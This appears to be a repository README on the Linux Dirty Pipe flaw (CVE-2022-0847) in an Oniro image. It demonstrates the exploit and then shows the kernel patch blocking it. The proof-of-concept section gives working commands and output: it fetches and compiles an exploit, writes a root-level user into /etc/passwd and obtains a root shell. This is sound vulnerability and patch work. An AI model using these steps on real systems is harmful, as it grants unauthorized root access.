## CVE-2022-0847

### Description
[Link to the CVE](https://nvd.nist.gov/vuln/detail/CVE-2022-0847)
> A flaw was found in the way the "flags" member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in the Linux kernel and could thus contain stale values. An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system.


### Proof of concept
In order to be able to use gcc on the oniro image add the following line to local.conf (I've also added the curl package, but that's not necessary for the exploit):

`IMAGE_INSTALL:append = " packagegroup-core-buildessential"`

On the oniro image:
- get the c code for the exploit

`curl https://dl.packetstormsecurity.net/2203-exploits/write_anything.c -o write_anything.c`

- compile it with gcc

`sudo gcc write_anything.c -o write_anything`

- change the ownership of the file (since we want to demonstrate a privilege escalation), and make it executable

```
sudo chown oniro write_anything
sudo chgrp oniro write_anything
chmod +x write_anything
```

- get the length of the first line of the `/etc/passwd` file (the offset for the exploit)

`head -n 1 /etc/passwd | wc`
Output:`         1         1        35`

- generate an hashed password (not in the oniro image)

`openssl passwd -6 password`
Output:`$6$sXnVH61ypXBVNMA/$OQlJXk2orRMHXya8GfVtdM42ZsislfQnKRaTW1V90TiE6VUGUbvuttAX4PmnU3zfe9QBHOp9H6EQMXoaqqD9x0`

- write an /etc/passwd entry for our new user:

`alemar:$6$sXnVH61ypXBVNMA/$OQlJXk2orRMHXya8GfVtdM42ZsislfQnKRaTW1V90TiE6VUGUbvuttAX4PmnU3zfe9QBHOp9H6EQMXoaqqD9x0:0:0:root:/root:/bin/sh`

- exploit!

```
./write_anything /etc/passwd 35 $'alemar:$6$sXnVH61ypXBVNMA/$OQlJXk2orRMHXya8GfVtdM42ZsislfQnKRaTW1V90TiE6VUGUbvuttAX4PmnU3zfe9QBHOp9H6EQMXoaqqD9x0:0:0:root:/root:/bin/sh\n'
```

- Now to take root privileges, just change user and type in the password you generated with openssl

```
su alemar
```

Result:
```
oniro@oniro-linux-qemux86-64:~$ ./write_anything /etc/passwd 35 $'alemar:$6$sXnVH61ypXBVNMA/$OQlJXk2orRMHXya8GfVtdM42ZsislfQnKRaTW1V90TiE6VUGUbvuttAX4PmnU3zfe9QBHOp9H6EQMXoaqqD9x0:0:0:root:/root:/bin/sh\n'
It worked!
oniro@oniro-linux-qemux86-64:~$ head /etc/passwd
root:x:0:0:root:/home/root:/bin/sh
alemar:$6$sXnVH61ypXBVNMA/$OQlJXk2orRMHXya8GfVtdM42ZsislfQnKRaTW1V90TiE6VUGUbvuttAX4PmnU3zfe9QBHOp9H6EQMXoaqqD9x0:0:0:root:/root:/bin/sh
nn/sync
games:x:5:60:games:/usr/games:/sbin/nologin
man:x:6:12:man:/var/cache/man:/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/sbin/nologin
mail:x:8:8:mail:/var/mail:/sbin/nologin
news:x:9:9:news:/var/spool/news:/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/sbin/nologin
proxy:x:13:13:proxy:/bin:/sbin/nologin
oniro@oniro-linux-qemux86-64:~$ su alemar
Password: 
root@oniro-linux-qemux86-64:/home/oniro# id
uid=0(root) gid=0(root) groups=0(root)
root@oniro-linux-qemux86-64:/home/oniro# whoami
root
```

### Patch

The patch for this vulnerability was introduced in this [commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/lib/iov_iter.c?id=9d2231c5d74e13b2a0546fee6737ee4446017903).

The patch can be found in the folder `meta-patchlayer` in the root of this repository.

In order to patch the kernel I've followed the [steps](https://docs.yoctoproject.org/kernel-dev/common.html#using-devtool-to-patch-the-kernel) in the Yocto documentation, using the `devtool` command.


Output of the exploit after patch:

```
oniro@oniro-linux-qemux86-64:~$ ./write_anything /etc/passwd 35 $'alemar:$6$sXnVH61ypXBVNMA/$OQlJXk2orRMHXya8GfVtdM42ZsislfQnKRaTW1V90TiE6VUGUbvuttAX4PmnU3zfe9QBHOp9H6EQMXoaqqD9x0:0:0:root:/root:/bin/sh\n'
It worked!
oniro@oniro-linux-qemux86-64:~$ cat /etc/passwd 
root:x:0:0:root:/home/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/sbin/nologin
bin:x:2:2:bin:/bin:/sbin/nologin
sys:x:3:3:sys:/dev:/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/sbin/nologin
man:x:6:12:man:/var/cache/man:/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/sbin/nologin
mail:x:8:8:mail:/var/mail:/sbin/nologin
news:x:9:9:news:/var/spool/news:/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/sbin/nologin
proxy:x:13:13:proxy:/bin:/sbin/nologin
www-data:x:33:33:www-data:/var/www:/sbin/nologin
backup:x:34:34:backup:/var/backups:/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/sbin/nologin
rauc-hawkbit:x:994:993::/:/bin/false
systemd-timesync:x:995:994::/:/sbin/nologin
systemd-resolve:x:996:995::/:/sbin/nologin
systemd-bus-proxy:x:997:997::/:/sbin/nologin
avahi:x:998:998::/run/avahi-daemon:/bin/false
messagebus:x:999:999::/var/lib/dbus:/bin/false
oniro:x:1000:1000::/home/oniro:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
oniro@oniro-linux-qemux86-64:~$ 
``` 

Even if the executable says "It worked", it actually didn't change anything in the /etc/passwd file. 
